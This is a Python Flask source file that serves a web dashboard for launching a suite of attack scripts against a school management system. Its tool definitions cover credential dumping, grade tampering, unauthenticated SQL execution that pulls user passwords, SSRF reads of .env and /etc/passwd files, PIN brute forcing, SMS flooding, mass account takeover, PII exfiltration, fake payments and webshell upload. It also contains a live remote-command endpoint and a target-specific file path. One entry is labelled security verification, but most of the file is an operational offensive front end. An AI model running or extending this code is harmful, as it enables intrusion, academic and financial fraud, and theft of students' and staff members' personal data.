import os, sys, re, json, time, threading, subprocess, requests as _req
from flask import Flask, render_template, request, Response, stream_with_context, jsonify

app  = Flask(__name__, template_folder=os.path.join(os.path.dirname(__file__), "templates"))
ROOT = os.path.dirname(os.path.abspath(__file__))
CLI  = os.path.join(ROOT, "cli")

# ── ANSI → HTML ───────────────────────────────────────────────────────────────

_ANSI = {
    "96": "color:#00ccff",  "36": "color:#00ccff",
    "92": "color:#00ff41",  "32": "color:#00ff41",
    "91": "color:#ff4444",  "31": "color:#ff4444",
    "93": "color:#ffaa00",  "33": "color:#ffaa00",
    "95": "color:#cc66ff",  "35": "color:#cc66ff",
    "90": "color:#555",     "2":  "color:#555",
    "1":  "font-weight:bold",
    "0":  None, "00": None,
}

def ansi_to_html(text):
    depth  = []
    result = []
    pos    = 0
    for m in re.finditer(r'\033\[([0-9;]*)m', text):
        result.append(text[pos:m.start()].replace("<","&lt;").replace(">","&gt;"))
        pos  = m.end()
        code = m.group(1)
        if code in ("0", "00", ""):
            result.append("</span>" * len(depth))
            depth.clear()
        else:
            for c in code.split(";"):
                style = _ANSI.get(c)
                if style:
                    result.append(f'<span style="{style}">')
                    depth.append(c)
    result.append(text[pos:].replace("<","&lt;").replace(">","&gt;"))
    result.append("</span>" * len(depth))
    return "".join(result)

# ── tool definitions ──────────────────────────────────────────────────────────

TOOLS = [
  { "id": "crowbar",   "name": "MadCrow",    "color": "#00ccff", "tag": "harvest · creds",
    "desc": "Credential rip via student portal endpoint",
    "script": "madcrow.py",
    "fields": [
      {"id":"base_url",   "label":"Target URL",        "type":"url",      "default":"",   "global":True},
      {"id":"session",    "label":"laravel_session",   "type":"password", "default":"",   "global":True},
      {"id":"xsrf",       "label":"XSRF Cookie",       "type":"password", "default":""},
      {"id":"sy_id",      "label":"SY ID",             "type":"number",   "default":"1"},
      {"id":"max_conc",   "label":"Concurrency",       "type":"number",   "default":"50"},
      {"id":"debug",      "label":"Debug",             "type":"select",   "default":"N",  "options":["N","y"]},
    ],
    "stdin": ["base_url","session","xsrf","sy_id","max_conc","debug"],
  },
  { "id": "reaper",    "name": "REAPER",     "color": "#cc66ff", "tag": "recon · enum",
    "desc": "Grade header recon & enumeration (brute-forces headers)",
    "script": "styx.py",
    "fields": [
      {"id":"base_url",     "label":"Target URL",        "type":"url",    "default":"",  "global":True},
      {"id":"session",      "label":"laravel_session",   "type":"password","default":"", "global":True},
      {"id":"sy_id",        "label":"SY ID",             "type":"number", "default":"1"},
      {"id":"max_conc",     "label":"Concurrency",       "type":"number", "default":"50"},
      {"id":"sid_range",    "label":"Max Section ID",    "type":"number", "default":"99"},
      {"id":"lid_range",    "label":"Max Level ID",      "type":"number", "default":"50"},
      {"id":"subid_range",  "label":"Max Subject ID",    "type":"number", "default":"50"},
      {"id":"debug",        "label":"Debug",             "type":"select", "default":"N", "options":["N","y"]},
    ],
    "stdin": ["base_url","session","sy_id","max_conc","sid_range","lid_range","subid_range","debug"],
  },
  { "id": "nexus",     "name": "NEXUS",      "color": "#ff4444", "tag": "chain · exploit",
    "desc": "Grade manipulation kill chain — 5-step attack on a single student",
    "script": "nexus.py",
    "fields": [
      {"id":"base_url",    "label":"Target URL",         "type":"url",      "default":"", "global":True},
      {"id":"sy",          "label":"SY ID",              "type":"number",   "default":"1"},
      {"id":"section",     "label":"Section ID",         "type":"number",   "default":"1"},
      {"id":"level",       "label":"Level ID",           "type":"number",   "default":"1"},
      {"id":"subj",        "label":"Subject ID",         "type":"number",   "default":"1"},
      {"id":"quarter",     "label":"Quarter",            "type":"number",   "default":"1"},
      {"id":"studid",      "label":"Student ID",         "type":"number",   "default":"1"},
      {"id":"grade",       "label":"Target Grade",       "type":"number",   "default":"100"},
      {"id":"session",     "label":"Student session",    "type":"password", "default":"", "global":True},
      {"id":"nondefault",  "label":"Non-default session","type":"password", "default":""},
    ],
    "stdin": ["base_url","sy","section","level","subj","quarter","studid","grade","session","nondefault"],
  },
  { "id": "trashfire", "name": "TRASHFIRE",  "color": "#ffaa00", "tag": "dump · unauth",
    "desc": "Unauth mastersheet mass grade dump across all sections",
    "script": "dumpster.py",
    "fields": [
      {"id":"base_url",  "label":"Target URL",     "type":"url",    "default":"", "global":True},
      {"id":"sy_id",     "label":"SY ID",          "type":"number", "default":"1"},
      {"id":"level_id",  "label":"Level ID",       "type":"number", "default":"1"},
      {"id":"quarter",   "label":"Quarter",        "type":"number", "default":"1"},
      {"id":"sid_range", "label":"Section range",  "type":"text",   "default":"1-200"},
      {"id":"max_conc",  "label":"Concurrency",    "type":"number", "default":"50"},
      {"id":"out_file",  "label":"Output file",    "type":"text",   "default":"dump.json"},
    ],
    "stdin": ["base_url","sy_id","level_id","quarter","sid_range","max_conc","out_file"],
  },
  { "id": "execveil",  "name": "EXECVEIL",   "color": "#ff4444", "tag": "rce · inject",
    "desc": "Formula injection → obfuscated RCE webshell deploy & interactive session",
    "script": "execveil.py",
    "fields": [
      {"id":"base_url",    "label":"Target URL",         "type":"url",      "default":"", "global":True},
      {"id":"session",     "label":"laravel_session",    "type":"password", "default":"", "global":True},
      {"id":"method",      "label":"HTTP method",        "type":"select",   "default":"GET","options":["GET","POST","PUT","PATCH"]},
      {"id":"token",       "label":"Shell token",        "type":"text",     "default":"evshell"},
      {"id":"cf",          "label":"cf_clearance",       "type":"password", "default":"", "global_cf":True},
      {"id":"poc",         "label":"POC",                "type":"select",   "default":"5",
       "options":["1","2","3","4","5"],
       "option_labels":["1 – curl webshell","2 – PS webshell","3 – direct cmd","4 – shell session","5 – deploy ev_shell"]},
      {"id":"shell_filename","label":"Shell filename (POC 5)", "type":"text",   "default":"ev.php"},
      {"id":"cmd",          "label":"Command (POC 3)",        "type":"text",   "default":"whoami"},
    ],
    "stdin": None,   # handled specially
    "special": "execveil",
  },
  { "id": "killchain", "name": "KILLCHAIN",  "color": "#00ff41", "tag": "auto · chain",
    "desc": "Automated TRASHFIRE → REAPER → NEXUS sweep for a named student",
    "script": "workflow.py",
    "fields": [
      {"id":"base_url",    "label":"Target URL",          "type":"url",      "default":"", "global":True},
      {"id":"sy_id",       "label":"SY ID",               "type":"number",   "default":"1"},
      {"id":"level_id",    "label":"Level ID",            "type":"number",   "default":"1"},
      {"id":"quarter",     "label":"Quarter",             "type":"number",   "default":"1"},
      {"id":"sid_range",   "label":"Section range",       "type":"text",     "default":"1-200"},
      {"id":"subid_range", "label":"Subject range",       "type":"text",     "default":"1-50"},
      {"id":"max_conc",    "label":"Concurrency",         "type":"number",   "default":"50"},
      {"id":"target_name", "label":"Target student name", "type":"text",     "default":""},
      {"id":"grade",       "label":"Target grade",        "type":"number",   "default":"100"},
      {"id":"session",     "label":"Student session",     "type":"password", "default":"", "global":True},
      {"id":"nondefault",  "label":"Non-default session", "type":"password", "default":""},
    ],
    "stdin": ["base_url","sy_id","level_id","quarter","sid_range","subid_range","max_conc","target_name","grade","session","nondefault"],
  },
  { "id": "venom",     "name": "VENOM",      "color": "#ff4444", "tag": "sqli · unauth",
    "desc": "Unauth raw SQL exec + full DB table dump via sync endpoints",
    "script": "sqlpwn.py",
    "special": "venom",
    "fields": [
      {"id":"base_url", "label":"Target URL", "type":"url", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",       "type":"select","default":"3",
       "options":["1","2","3","4","6"],
       "option_labels":["1 – Dump table rows","2 – Get table columns","3 – Dump users + passwords","4 – Execute raw SQL","6 – SELECT exfiltration"]},
      {"id":"table",    "label":"Table name",       "type":"text",   "default":"users"},
      {"id":"max_id",   "label":"Start from ID",    "type":"number", "default":"0"},
      {"id":"sql_query","label":"SQL query",        "type":"text",   "default":"UPDATE syncsetup SET url=(SELECT GROUP_CONCAT(email,':',passwordstr) FROM users) WHERE id=1"},
      {"id":"select_sub","label":"SELECT subquery", "type":"text",   "default":"GROUP_CONCAT(email,0x3a,passwordstr SEPARATOR 0x0a) FROM users"},
    ],
    "stdin": None,
  },
  { "id": "specter",   "name": "SPECTER",    "color": "#555", "tag": "ghost · unauth",
    "desc": "Unauth PII / credentials / backup / grade-post harvester",
    "script": "ghost.py",
    "special": "specter",
    "fields": [
      {"id":"base_url", "label":"Target URL", "type":"url",    "default":"", "global":True},
      {"id":"sy_id",    "label":"SY ID",      "type":"number", "default":"1"},
      {"id":"mode",     "label":"Mode",       "type":"select", "default":"2",
       "options":["1","2","3","4","5","6"],
       "option_labels":["1 – Student PII harvest","2 – User credential dump","3 – Grade mass approve+post","4 – Trigger DB backup","5 – Download backup file","6 – Update contact number"]},
      {"id":"level_id",  "label":"Level ID (PII)",        "type":"text",     "default":""},
      {"id":"sem_id",    "label":"Semester ID (PII)",      "type":"text",     "default":""},
      {"id":"status",    "label":"Student status",         "type":"text",     "default":"all"},
      {"id":"filename",  "label":"Backup filename",        "type":"text",     "default":""},
      {"id":"stud_id",   "label":"Student ID (contact)",   "type":"number",   "default":"1"},
      {"id":"new_num",   "label":"New contact number",     "type":"text",     "default":""},
    ],
    "stdin": None,
  },
  { "id": "wraith",    "name": "WRAITH",     "color": "#cc66ff", "tag": "ssrf · lfi",
    "desc": "SSRF + path traversal .env & arbitrary file stealer",
    "script": "ssrfetch.py",
    "special": "wraith",
    "fields": [
      {"id":"base_url", "label":"Target URL",          "type":"url",      "default":"", "global":True},
      {"id":"session",  "label":"laravel_session",     "type":"password", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",                "type":"select",   "default":"4",
       "options":["1","2","3","4"],
       "option_labels":["1 – Read .env (Windows path)","2 – Read arbitrary file","3 – Path traversal download","4 – Quick .env steal (auto)"]},
      {"id":"env_path",  "label":".env file URI",       "type":"text",   "default":"file:///c:/laragon/www/es_ldcu/.env"},
      {"id":"file_uri",  "label":"Arbitrary file URI",  "type":"text",   "default":"file:///etc/passwd"},
      {"id":"tablename", "label":"Table name (SSRF)",   "type":"text",   "default":"onlinepayments"},
      {"id":"filepath",  "label":"Path traversal path", "type":"text",   "default":"../../.env"},
      {"id":"out_name",  "label":"Save as",             "type":"text",   "default":"stolen_file"},
    ],
    "stdin": None,
  },
  { "id": "lockpick",  "name": "LOCKPICK",   "color": "#ffaa00", "tag": "brute · cashier",
    "desc": "Cashier void PIN bruteforce 0000–9999 → void any transaction",
    "script": "pincrack.py",
    "special": "lockpick",
    "fields": [
      {"id":"base_url",   "label":"Target URL",        "type":"url",      "default":"", "global":True},
      {"id":"session",    "label":"laravel_session",   "type":"password", "default":"", "global":True},
      {"id":"max_conc",   "label":"Concurrency",       "type":"number",   "default":"50"},
      {"id":"pin_id",     "label":"PIN ID (0=auto-detect)", "type":"number","default":"0"},
      {"id":"trans_id",   "label":"Transaction ID to void", "type":"number","default":"1"},
    ],
    "stdin": None,
  },
  { "id": "siren",     "name": "SIREN",      "color": "#00ccff", "tag": "inject · unauth",
    "desc": "Unauth SMS inject / flood any phone number",
    "script": "smsbomb.py",
    "fields": [
      {"id":"base_url",  "label":"Target URL",      "type":"url",    "default":"", "global":True},
      {"id":"mode",      "label":"Mode",            "type":"select", "default":"1",
       "options":["1","2","3"],
       "option_labels":["1 – Single SMS","2 – Flood (N messages)","3 – Bulk from file"]},
      {"id":"phone",     "label":"Phone number",    "type":"text",   "default":"09XXXXXXXXX"},
      {"id":"count",     "label":"Message count",   "type":"number", "default":"10"},
      {"id":"delay",     "label":"Delay (sec)",     "type":"number", "default":"0"},
      {"id":"max_conc",  "label":"Concurrency",     "type":"number", "default":"10"},
      {"id":"file",      "label":"Phone list file", "type":"text",   "default":"phones.txt"},
    ],
    "stdin": None,
  },
  { "id": "keyhammer", "name": "KEYHAMMER",  "color": "#ff4444", "tag": "takeover · auth",
    "desc": "Mass account takeover via password reset sweep — resets to 123456",
    "script": "passreset.py",
    "fields": [
      {"id":"base_url",   "label":"Target URL",        "type":"url",      "default":"", "global":True},
      {"id":"session",    "label":"laravel_session",   "type":"password", "default":"", "global":True},
      {"id":"mode",       "label":"Mode",              "type":"select",   "default":"2",
       "options":["1","2"],
       "option_labels":["1 – Single user ID","2 – Range sweep"]},
      {"id":"uid",        "label":"User ID",           "type":"number",   "default":"1"},
      {"id":"uid_range",  "label":"ID range",          "type":"text",     "default":"1-50"},
      {"id":"max_conc",   "label":"Concurrency",       "type":"number",   "default":"20"},
    ],
    "stdin": None,
  },

  # ── NEW TOOLS ──────────────────────────────────────────────────────────────
  { "id": "overlord", "name": "OVERLORD",  "color": "#ff4444", "tag": "takeover · admin",
    "desc": "Admin portal takeover — password reset, credential dump, account creation, full chain",
    "script": "adminpwn.py",
    "special": "overlord",
    "fields": [
      {"id":"base_url", "label":"Target URL", "type":"url", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",       "type":"select","default":"1",
       "options":["1","2","3","4","5","6","7","8"],
       "option_labels":["1 – Reset any password","2 – Dump plaintext passwords","3 – Create account (any role)",
                        "4 – Grant/revoke privilege","5 – Mass deactivation","6 – Mass account creation (fixAccountConflict)",
                        "7 – Sync DB delete","8 – Full auto-takeover chain"]},
      {"id":"target_email","label":"Target email/TID","type":"text","default":"admin@school.edu"},
      {"id":"lname",       "label":"Last name",       "type":"text","default":"Test"},
      {"id":"fname",       "label":"First name",      "type":"text","default":"Admin"},
      {"id":"utype",       "label":"Role type (17=SA)","type":"text","default":"17"},
      {"id":"userid",      "label":"User ID",         "type":"number","default":"1"},
      {"id":"id_range",    "label":"ID range",        "type":"text","default":"1-100"},
      {"id":"candidates",  "label":"Auto-chain targets (comma)", "type":"text","default":"admin@school.edu,superadmin"},
    ],
    "stdin": None,
  },
  { "id": "hydra",    "name": "HYDRA",     "color": "#cc66ff", "tag": "grades · college",
    "desc": "College & Principal grade exploit — corruption, approval bypass, signatory overwrite",
    "script": "collegepwn.py",
    "special": "hydra",
    "fields": [
      {"id":"base_url", "label":"Target URL",       "type":"url",      "default":"", "global":True},
      {"id":"session",  "label":"laravel_session",  "type":"password", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",             "type":"select",   "default":"1",
       "options":["1","2","3","4","5","6","7","8"],
       "option_labels":["1 – Grade corruption (unauth)","2 – Modify K-12 grades","3 – Self-approve + post",
                        "4 – Remove/add subject","5 – Grade status submit (unauth)","6 – College grade dump (unauth)",
                        "7 – Deportment status write (unauth)","8 – Overwrite SF9 signatory"]},
      {"id":"grade_id",   "label":"Grade ID / range",     "type":"text",  "default":"1-50"},
      {"id":"column",     "label":"Column",               "type":"text",  "default":"qg"},
      {"id":"value",      "label":"Value",                "type":"text",  "default":"100"},
      {"id":"header_id",  "label":"Grade header ID",      "type":"text",  "default":"1"},
      {"id":"syid",       "label":"SY ID",                "type":"number","default":"1"},
      {"id":"section",    "label":"Section ID",           "type":"number","default":"1"},
      {"id":"quarter",    "label":"Quarter",              "type":"number","default":"1"},
      {"id":"stud_ids",   "label":"Student IDs (range)",  "type":"text",  "default":"1-20"},
      {"id":"sig_name",   "label":"Signatory name",       "type":"text",  "default":""},
    ],
    "stdin": None,
  },
  { "id": "oracle",   "name": "ORACLE",    "color": "#00ccff", "tag": "exfil · data",
    "desc": "Mass data exfiltration — mobile API, employee PII, finance dashboards, student DB",
    "script": "datapwn.py",
    "special": "oracle",
    "fields": [
      {"id":"base_url", "label":"Target URL",       "type":"url",      "default":"", "global":True},
      {"id":"session",  "label":"laravel_session",  "type":"password", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",             "type":"select",   "default":"1",
       "options":["1","2","3","4","5","6","7"],
       "option_labels":["1 – Student financial dump","2 – Grade report cards","3 – Employee PII dump",
                        "4 – Director finance dashboards","5 – Student DB enum","6 – Principal data read",
                        "7 – Attendance manipulation"]},
      {"id":"id_range",  "label":"Student ID range","type":"text",   "default":"1-200"},
      {"id":"syid",      "label":"SY ID",           "type":"number", "default":"1"},
      {"id":"section",   "label":"Section ID",      "type":"number", "default":"1"},
      {"id":"level",     "label":"Level ID",        "type":"number", "default":"7"},
      {"id":"date",      "label":"Date (attendance)","type":"text",  "default":"2026-06-11"},
      {"id":"att_status","label":"Attendance status","type":"select","default":"absent",
       "options":["absent","present","late"]},
    ],
    "stdin": None,
  },
  { "id": "forge",    "name": "FORGE",     "color": "#ffaa00", "tag": "cashier · finance",
    "desc": "Cashier & Finance ops — fake payments, receipt print, void bypass, PIN brute",
    "script": "cashierpwn.py",
    "special": "forge",
    "fields": [
      {"id":"base_url",   "label":"Target URL",       "type":"url",      "default":"", "global":True},
      {"id":"session",    "label":"laravel_session",  "type":"password", "default":"", "global":True},
      {"id":"mode",       "label":"Mode",             "type":"select",   "default":"1",
       "options":["1","2","3","4","5"],
       "option_labels":["1 – Fake payment (any session)","2 – Print any receipt","3 – Void suspended sale",
                        "4 – Finance void bypass (no PIN)","5 – Finance PIN brute force"]},
      {"id":"student_id", "label":"Student ID",        "type":"number", "default":"1"},
      {"id":"amount",     "label":"Amount",            "type":"text",   "default":"1000"},
      {"id":"ornum",      "label":"OR number",         "type":"text",   "default":""},
      {"id":"adj_id",     "label":"Adjustment ID",     "type":"text",   "default":"1"},
      {"id":"max_conc",   "label":"Concurrency (brute)","type":"number","default":"50"},
    ],
    "stdin": None,
  },
  { "id": "payload",  "name": "PAYLOAD",   "color": "#ff4444", "tag": "rce · upload",
    "desc": "File upload RCE + Registrar enrollment ops — scholarship shell, pre-reg spam",
    "script": "uploadpwn.py",
    "special": "payload",
    "fields": [
      {"id":"base_url", "label":"Target URL",       "type":"url",      "default":"", "global":True},
      {"id":"session",  "label":"laravel_session",  "type":"password", "default":"", "global":True},
      {"id":"mode",     "label":"Mode",             "type":"select",   "default":"1",
       "options":["1","2","3","4","5"],
       "option_labels":["1 – Upload PHP shell","2 – Execute cmd on shell","3 – Enrollment manipulation",
                        "4 – Delete academic config","5 – Pre-registration spam"]},
      {"id":"shell_url", "label":"Shell URL/filename","type":"text",  "default":""},
      {"id":"cmd",       "label":"Command",           "type":"text",  "default":"whoami"},
      {"id":"id_range",  "label":"Student ID range",  "type":"text",  "default":"1-50"},
      {"id":"resource",  "label":"Resource (colleges/grading-setup)","type":"text","default":"colleges"},
      {"id":"res_id",    "label":"Resource ID",        "type":"text",  "default":"1"},
      {"id":"spam_count","label":"Spam count",         "type":"number","default":"50"},
    ],
    "stdin": None,
  },
  { "id": "autoscan", "name": "AUTOSCAN",  "color": "#3fb950", "tag": "verify · all",
    "desc": "Automated security verification — tests all findings from Unified Report, outputs pass/fail matrix",
    "script": "autoscan.py",
    "special": "autoscan",
    "fields": [
      {"id":"base_url",    "label":"Target URL",        "type":"url",      "default":"", "global":True},
      {"id":"email",       "label":"Email / Username",  "type":"text",     "default":""},
      {"id":"password",    "label":"Password",          "type":"password", "default":""},
      {"id":"session",     "label":"Session (or auto-login above)", "type":"password", "default":"", "global":True},
      {"id":"concurrency", "label":"Concurrency",       "type":"number",   "default":"3"},
      {"id":"timeout",     "label":"Timeout (sec)",     "type":"number",   "default":"30"},
    ],
    "stdin": None,
  },
]

TOOL_MAP = {t["id"]: t for t in TOOLS}

# ── stdin builders ────────────────────────────────────────────────────────────

def build_stdin(tool_id, data):
    tool = TOOL_MAP[tool_id]
    special = tool.get("special")

    if special == "autoscan":
        return ""  # autoscan uses CLI args, not stdin

    if special == "execveil":
        poc    = data.get("poc", "5")
        lines  = [data.get("base_url",""), data.get("session",""),
                  data.get("method","GET"), data.get("token","evshell"),
                  data.get("cf",""), poc]
        if poc == "1":
            lines += [data.get("shell_url",""), data.get("ev_url","")]
        elif poc == "2":
            lines += [data.get("shell_url",""), data.get("ev_url","")]
        elif poc == "3":
            lines += [data.get("cmd","whoami"), data.get("shell_url","")]
        elif poc == "4":
            lines += [data.get("shell_url","/ev.php")]
        elif poc == "5":
            lines += [data.get("shell_filename","ev.php"), "N", "exit"]
        lines.append("0")  # exit menu
        return "\n".join(lines) + "\n"

    if special == "venom":
        mode = data.get("mode","3")
        lines = [data.get("base_url",""), mode]
        if mode == "1":
            lines += [data.get("table","users"), data.get("max_id","0")]
        elif mode == "2":
            lines += [data.get("table","users")]
        elif mode == "3":
            pass
        elif mode == "4":
            lines += [data.get("sql_query",""), ""]
        elif mode == "6":
            lines += [data.get("select_sub","")]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "specter":
        mode = data.get("mode","2")
        lines = [data.get("base_url",""), data.get("sy_id","1"), mode]
        if mode == "1":
            lines += [data.get("level_id",""), data.get("sem_id",""), data.get("status","all")]
        elif mode == "3":
            lines.append("y")   # confirm
            lines.append("n")   # don't reset to pending
        elif mode == "5":
            lines.append(data.get("filename",""))
        elif mode == "6":
            lines += [data.get("stud_id","1"), data.get("new_num","")]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "wraith":
        mode = data.get("mode","4")
        lines = [data.get("base_url",""), data.get("session",""), mode]
        if mode == "1":
            lines.append(data.get("env_path","file:///c:/laragon/www/es_ldcu/.env"))
        elif mode == "2":
            lines += [data.get("file_uri",""), data.get("tablename","onlinepayments")]
        elif mode == "3":
            lines += [data.get("filepath","../../.env"), data.get("out_name","stolen_file")]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "lockpick":
        pin_id = data.get("pin_id","0")
        lines  = [data.get("base_url",""), data.get("session",""), data.get("max_conc","50")]
        if pin_id and pin_id != "0":
            lines.append(pin_id)
        lines += [data.get("trans_id","1"), "y", "n"]
        return "\n".join(lines) + "\n"

    # mode-based tools
    if tool_id == "siren":
        mode  = data.get("mode","1")
        lines = [data.get("base_url",""), mode]
        if mode == "1":
            lines.append(data.get("phone",""))
        elif mode == "2":
            lines += [data.get("phone",""), data.get("count","10"),
                      data.get("delay","0"), data.get("max_conc","10")]
        elif mode == "3":
            lines += [data.get("file","phones.txt"), data.get("count","1"),
                      data.get("delay","0"), data.get("max_conc","20")]
        return "\n".join(lines) + "\n"

    if tool_id == "keyhammer":
        mode  = data.get("mode","2")
        lines = [data.get("base_url",""), data.get("session",""), mode]
        if mode == "1":
            lines.append(data.get("uid","1"))
        elif mode == "2":
            lines += [data.get("uid_range","1-50"), data.get("max_conc","20")]
        return "\n".join(lines) + "\n"

    # ── new tools: overlord, hydra, oracle, forge, payload ────────────────────
    if special == "overlord":
        mode = data.get("mode", "1")
        lines = [data.get("base_url", "")]
        lines.append(mode)
        if mode == "1":
            lines.append(data.get("target_email", "admin@school.edu"))
        elif mode == "3":
            lines += [data.get("lname","Test"), data.get("fname","Admin"),
                      data.get("utype","17"), data.get("target_email","")]
        elif mode == "4":
            lines += [data.get("userid","1"), data.get("utype","17"), "1"]
        elif mode == "5":
            lines.append(data.get("id_range", "1-100"))
        elif mode == "6":
            lines.append("y")
        elif mode == "7":
            lines.append(data.get("id_range", "1-5"))
        elif mode == "8":
            lines.append(data.get("candidates", ""))
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "hydra":
        mode = data.get("mode", "1")
        lines = [data.get("base_url", "")]
        lines.append(mode)
        if mode == "1":
            lines += [data.get("grade_id","1-50"), data.get("column","qg"), data.get("value","100")]
        elif mode == "2":
            lines += [data.get("session",""), data.get("grade_id","1"), data.get("value","100"), data.get("grade_id","1")]
        elif mode == "3":
            lines += [data.get("session",""), data.get("header_id","1"),
                      data.get("syid","1"), "1", "1", "FINAL"]
        elif mode == "5":
            lines += [data.get("grade_id","1"), "submitted"]
        elif mode == "6":
            lines += [data.get("syid","1"), "1", "1-20", "1-10", "N"]
        elif mode == "7":
            lines += [data.get("stud_ids","1-20"), data.get("syid","1"),
                      data.get("section","1"), data.get("quarter","1"), "5"]
        elif mode == "8":
            lines += [data.get("session",""), data.get("syid","1"), "overwrite",
                      "1", data.get("sig_name","PWNED"), "Unauthorized"]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "oracle":
        mode = data.get("mode", "1")
        lines = [data.get("base_url", "")]
        lines.append(mode)
        if mode in ("1", "2"):
            lines += [data.get("id_range","1-200"), data.get("syid","1")]
        elif mode == "6":
            lines += [data.get("session",""), data.get("syid","1"),
                      data.get("section","1"), data.get("level","7")]
        elif mode == "7":
            lines += [data.get("session",""), data.get("id_range","100-110"),
                      data.get("date","2026-06-11"), data.get("att_status","absent")]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "forge":
        mode = data.get("mode", "1")
        lines = [data.get("base_url", "")]
        lines.append(mode)
        if mode == "1":
            lines += [data.get("session",""), data.get("student_id","1"), data.get("amount","1000")]
        elif mode == "2":
            lines += [data.get("session",""), data.get("ornum",""), data.get("student_id","1")]
        elif mode == "3":
            lines += [data.get("session","")]
        elif mode == "4":
            lines += [data.get("session",""), data.get("adj_id","1")]
        elif mode == "5":
            lines += [data.get("session",""), data.get("max_conc","50")]
        lines.append("0")
        return "\n".join(lines) + "\n"

    if special == "payload":
        mode = data.get("mode", "1")
        lines = [data.get("base_url", "")]
        lines.append(mode)
        if mode == "1":
            lines.append(data.get("session",""))
        elif mode == "2":
            lines.append(data.get("shell_url",""))
        elif mode == "3":
            lines += ["pre-enroll", data.get("id_range","1-50")]
        elif mode == "4":
            lines += [data.get("session",""), data.get("resource","colleges"), data.get("res_id","1")]
        elif mode == "5":
            lines.append(data.get("spam_count","50"))
        lines.append("0")
        return "\n".join(lines) + "\n"

    # fixed-order tools
    if tool.get("stdin") is not None:
        fmap = {f["id"]: f.get("default","") for f in tool["fields"]}
        fmap.update(data)
        return "\n".join(str(fmap.get(k,"")) for k in tool["stdin"]) + "\n"

    return "\n"

# ── active processes store ────────────────────────────────────────────────────

_procs = {}
_procs_lock = threading.Lock()

# ── routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html", tools=TOOLS)

@app.route("/docs")
def docs():
    return render_template("docs.html", tools=TOOLS)

@app.route("/api/run/<tool_id>", methods=["POST"])
def run_tool(tool_id):
    tool = TOOL_MAP.get(tool_id)
    if not tool:
        return jsonify({"error": "Unknown tool"}), 404

    data    = request.get_json() or {}
    script  = os.path.join(CLI, tool["script"])

    # AUTOSCAN uses CLI args instead of stdin
    if tool.get("special") == "autoscan":
        cmd_args = [sys.executable, "-u", script,
                    "--url", data.get("base_url", ""),
                    "--concurrency", str(data.get("concurrency", "10")),
                    "--timeout", str(data.get("timeout", "10"))]
        if data.get("session"):
            cmd_args += ["--session", data["session"]]
        if data.get("email"):
            cmd_args += ["--email", data["email"]]
        if data.get("password"):
            cmd_args += ["--password", data["password"]]
        stdin_s = ""
    else:
        cmd_args = [sys.executable, "-u", script]
        stdin_s = build_stdin(tool_id, data)

    def generate():
        proc = subprocess.Popen(
            cmd_args,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, cwd=CLI,
            bufsize=0,
            env={**os.environ, "PYTHONUNBUFFERED": "1"},
        )
        with _procs_lock:
            _procs[tool_id] = proc

        # feed all stdin upfront
        try:
            if stdin_s:
                proc.stdin.write(stdin_s.encode())
                proc.stdin.flush()
            proc.stdin.close()
        except Exception:
            pass

        try:
            buf = b""
            while True:
                chunk = proc.stdout.read(1)
                if not chunk:
                    # flush remaining buffer
                    if buf:
                        line = buf.decode("utf-8", errors="replace")
                        for part in line.split("\r"):
                            part = part.strip("\n")
                            if part:
                                yield f"data: {json.dumps(ansi_to_html(part))}\n\n"
                    break
                buf += chunk
                # emit on newline or carriage return (tqdm uses \r)
                if chunk in (b"\n", b"\r"):
                    line = buf.decode("utf-8", errors="replace").strip("\r\n")
                    if line:
                        yield f"data: {json.dumps(ansi_to_html(line))}\n\n"
                    buf = b""
            proc.wait()
        except GeneratorExit:
            proc.kill()
        finally:
            with _procs_lock:
                _procs.pop(tool_id, None)

        yield f"data: {json.dumps('__DONE__')}\n\n"

    return Response(stream_with_context(generate()),
                    content_type="text/event-stream",
                    headers={"X-Accel-Buffering": "no", "Cache-Control": "no-cache"})

@app.route("/api/kill/<tool_id>", methods=["POST"])
def kill_tool(tool_id):
    with _procs_lock:
        proc = _procs.pop(tool_id, None)
    if proc:
        proc.kill()
        return jsonify({"killed": True})
    return jsonify({"killed": False})

# ── shell session (EXECVEIL interactive) ─────────────────────────────────────

_shell = {}

@app.route("/api/shell/connect", methods=["POST"])
def shell_connect():
    body = request.get_json() or {}
    _shell["url"]     = body.get("url","").rstrip("/")
    _shell["path"]    = body.get("path", "/ev.php")
    _shell["token"]   = body.get("token","evshell")
    _shell["cookie"]  = body.get("cookie","")
    _shell["cf"]      = body.get("cf","")
    return jsonify({"connected": True, "endpoint": _shell["url"] + _shell["path"]})

@app.route("/api/shell/exec", methods=["POST"])
def shell_exec():
    body = request.get_json() or {}
    cmd  = body.get("cmd","").strip()
    if not cmd or not _shell.get("url"):
        return jsonify({"out":"", "code":-1, "error":"Not connected"})
    cookie = f"laravel_session={_shell['cookie']}"
    if _shell.get("cf"):
        cookie += f"; cf_clearance={_shell['cf']}"
    hdrs = {"Cookie": cookie}
    try:
        r = _req.get(
            _shell["url"] + _shell["path"],
            params={"t": _shell["token"], "cmd": cmd},
            headers=hdrs, timeout=15, stream=True,
        )
        buf = ""
        for chunk in r.iter_content(512, decode_unicode=True):
            buf += chunk
        try:
            d = json.loads(buf)
            return jsonify({"out": d.get("out",""), "code": d.get("code",0)})
        except Exception:
            return jsonify({"out": buf, "code": r.status_code})
    except Exception as e:
        return jsonify({"out": str(e), "code": -1, "error": True})

# ── AUTOSCAN API (structured JSON result) ─────────────────────────────────────

@app.route("/api/autoscan", methods=["POST"])
def api_autoscan():
    """Run autoscan and return structured JSON report (non-streaming)."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("autoscan", os.path.join(CLI, "autoscan.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    data = request.get_json() or {}
    base_url = data.get("base_url", "").strip().rstrip("/")
    session_cookie = data.get("session", "")
    email = data.get("email", "")
    password = data.get("password", "")
    concurrency = int(data.get("concurrency", 10))
